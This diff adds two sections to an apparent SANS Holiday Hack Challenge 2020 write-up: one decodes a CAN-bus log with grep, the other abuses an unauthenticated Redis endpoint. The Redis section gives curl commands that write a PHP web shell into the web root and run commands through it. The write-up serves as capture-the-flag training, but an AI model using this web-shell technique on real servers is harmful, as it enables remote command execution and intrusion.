@@ -536,3 +536,95 @@ If we look at and compare `ARP_PACKETS[0][ARP]` and `ARP_PACKETS[1][ARP]` we can
 ```
 ![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/190b793a-40f3-459a-b4fb-644d86195e86)
 
+#  
+#  
+#  
+
+# CHALLENGE 11 - CAN-Bus Investigation #
+
+## HINTS: ##
+<details>
+  <summary>Hints provided for Challenge 11</summary>
+  
+>-	**WUNROSE OPENSLAE:** You can hide lines you don't want to see with commands like ``cat file.txt | grep -v badstuff``
+>-	**WUNROSE OPENSLAE:** Chris Elgee is talking about how [CAN traffic](https://www.youtube.com/watch?v=96u-uHRBI0I) works right now!
+
+
+</details>
+
+  
+## PROCEDURE : ##
+`candump.log` contains a lot of entries that are meaningless to us.  The most common ones start with `244` or `188` – so let’s `grep` these out of the way:
+```
+~$ cat candump.log | grep -v 244# | grep -v 188#
+```
+![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/ec2ac0b1-eb86-4fd0-b027-b83993c11cd8)
+
+We are left with three entries and we know there was a **LOCK**, **UNLOCK** and **LOCK** event sequence, so we can assume that the second entry must correspond to the **UNLOCK signal**... so:
+
+```
+~$ ./runtoanswer
+> 122520
+```
+![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/ee6d1eb8-5099-47d7-977a-1d3acc670f7b)
+
+#  
+#  
+#  
+
+# CHALLENGE 12 - Redis Bug #
+
+## HINTS: ##
+<details>
+  <summary>Hints provided for Challenge 12</summary>
+  
+>-	**HOLLY EVERGREEN:** [This](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) is kind of what we're trying to do...
+
+
+</details>
+
+  
+## PROCEDURE : ##
+Running ``~$ curl http://localhost/maintenance.php`` shows us that multiple arguments need to be separated by commas instead of spaces in the `curl` command…this is a very useful tip for what we need to do next.
+
+``~$ curl http://localhost/maintenance.php?cmd=info`` shows us that we can run `redis-cli` commands without authorisation.  It also tells us that there is one database with index `0`
+```
+~$ curl http://localhost/maintenance.php?cmd=SELECT,0
+~$ curl http://localhost/maintenance.php?cmd=KEYS,*
+~$ curl http://localhost/maintenance.php?cmd=GET,dir
+```
+And we see `/var/www/html` this must be the path to the website folder.
+
+Now we can pretty much follow the steps in [the link](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)  provided in Holly Evergreen’s Hint.
+
+We move to the webserver directory:
+```
+curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html/
+```
+
+Create a file named `hackme.php`
+```
+curl http://localhost/maintenance.php?cmd=config,set,dbfilename,hackme.php
+```
+
+Then place a malicious bit of php code in that file which will allow us to pass on any command;
+```
+"<?php echo shell_exec($_GET['cmd']);?>"
+```
+**Note:** the php script was formatted using the **URL encode** module on [CyberChef](https://gchq.github.io/CyberChef/):
+```
+curl http://localhost/maintenance.php?cmd=set%2Ctest%2C%22%3C%3Fphp%20echo%20shell%5Fexec%28%24%5FGET%5B%27cmd%27%5D%29%3B%3F%3E%22
+```
+
+And save
+```
+curl http://localhost/maintenance.php?cmd=save
+```
+
+Finally we can request the contents of `index.php` by passing a `cat` command as the following curl:
+```
+curl http://localhost/hackme.php?cmd=cat%20index.php --output -
+```
+And sure enough there is a bug in `index.php` !
+
+![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/263bcb66-9f01-463b-a79d-bcc413b9d6c0)
